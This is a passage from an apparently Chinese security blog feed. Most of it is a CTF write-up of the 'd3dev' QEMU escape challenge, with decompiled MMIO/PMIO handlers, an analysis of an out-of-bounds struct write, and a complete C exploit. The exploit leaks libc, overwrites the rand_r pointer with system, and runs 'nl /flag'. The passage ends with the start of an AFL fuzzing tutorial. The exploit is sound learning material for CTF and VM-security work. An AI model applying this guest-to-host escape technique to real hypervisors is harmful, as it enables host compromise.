class="built_in">memcpy</span>(userbuf + i * <span class="number">0x18</span>, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_cmd(<span class="number">1</span>, phy_userbuf, <span class="number">0x11</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321155543134.png"                      alt="image-20230321155543134"                ></p><h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>先看看结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">d3devState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">uint32_t</span> memory_mode;</span><br><span class="line">  <span class="keyword">uint32_t</span> seek;</span><br><span class="line">  <span class="keyword">uint32_t</span> init_flag;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_read_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_write_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> r_seed;</span><br><span class="line">  <span class="keyword">uint64_t</span> blocks[<span class="number">257</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + (result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mmio_read</code>函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *(v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = (v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = __PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>mmio_write</code>函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, <span class="number">28LL</span>, val, *&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != &amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不说<code>pmio_read</code>函数了，因为确实没啥用就不浪费篇幅了。这里看<code>pmio_write</code>函数，可以喊到在port等于28时会给<code>r_seek</code>赋值，并且会调用<code>opaque-&gt;rand_r</code>第一个参数就是<code>opaque-&gt;r_seed</code>的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用思路也是较为清晰的</p><ol><li>  首先修改seek配合addr实现使用<code>mmio_write</code>函数实现越界写，将<code>opaque-&gt;rand_r</code>原有的函数地址进行tea加密并且写入到当前位置。</li><li>  两次调用<code>mmio_read</code>函数，分别读取<code>opaque-&gt;rand_r</code>高位和低位泄漏出libc地址，进而拿到system地址。</li><li>  应为<code>r_seek</code>成员和<code>blocks</code>成员紧邻的缘故，恢复seek为0并通过addr在<code>blocks</code>成员开始位置写入<code>flag</code></li><li>  最后直接调用<code>pmio_write</code>并且port为28修改<code>r_seed</code>为<code>nl /</code>即可调用<code>nl /flag</code></li></ol><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">size_t</span> port, <span class="keyword">u_int32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">size_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">tea</span><span class="params">(<span class="keyword">size_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v3;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v4;   <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v3 = m;</span><br><span class="line">    v4 = <span class="number">-957401312</span>;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    result = v3 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = result - ((v5 + v4) ^ (key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">        v5 -= (result + v4) ^ (key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">        v4 += <span class="number">1640531527</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | (<span class="keyword">u_int64_t</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;iopl fail!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand_r;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">    rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    rand_r += ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)mmio_read(<span class="number">0x18</span>)) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    libc_base = rand_r - <span class="number">0x25d30</span>;</span><br><span class="line">    system_addr = libc_base + <span class="number">0x30290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, rand_r);</span><br><span class="line"></span><br><span class="line">    key[<span class="number">0</span>] = pmio_read(<span class="number">12</span>);</span><br><span class="line">    key[<span class="number">1</span>] = pmio_read(<span class="number">16</span>);</span><br><span class="line">    key[<span class="number">2</span>] = pmio_read(<span class="number">20</span>);</span><br><span class="line">    key[<span class="number">3</span>] = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key%d: %p\n&quot;</span>, i, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t_system_addr;</span><br><span class="line">    t_system_addr = tea(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>, <span class="number">0x2f206c6e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321154453844.png"                      alt="image-20230321154453844"                ></p><hr><p>题目链接:<br>    <a class="link"   href="https://github.com/196082/196082/tree/main/qemu_escape" >https://github.com/196082/196082/tree/main/qemu_escape<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。&lt;/p&gt;
&lt;h2 id=&quot;FastCP-ctf&quot;&gt;&lt;a href=&quot;#FastCP-ctf&quot; cla</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(1):初探AFL</title>
    <link href="https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"/>
    <id>https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/</id>
    <published>2023-03-18T06:32:59.000Z</published>
    <updated>2023-03-18T07:33:05.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。</p><h2 id="AFL-FUZZ介绍"><a href="#AFL-FUZZ介绍" class="headerlink" title="AFL-FUZZ介绍"></a>AFL-FUZZ介绍</h2><p>AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。</p><h2 id="白盒下的FUZZ"><a href="#白盒下的FUZZ" class="headerlink" title="白盒下的FUZZ"></a>白盒下的FUZZ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span 